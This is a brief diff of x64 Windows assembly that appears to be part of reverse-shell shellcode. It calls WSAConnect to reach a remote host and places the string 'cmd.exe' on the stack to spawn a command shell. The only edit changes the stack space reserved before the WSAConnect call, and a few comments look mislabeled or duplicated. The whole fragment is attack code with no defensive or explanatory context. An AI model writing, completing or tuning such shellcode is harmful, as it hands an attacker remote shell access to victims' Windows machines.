@@ -56,7 +56,7 @@ main:
     push r9                     ; NULL lpCallerData
     push r9                     ; NULL lpCallerData
     push r9                     ; NULL lpSQOS
-    sub rsp, 0x90               ; NULL lpSQOS
+    sub rsp, 208              ; NULL lpSQOS
     call WSAConnect             ; Call WSAConnect
 
     mov rax, 0x6578652e646d63     ; Push cmd.exe string to stack
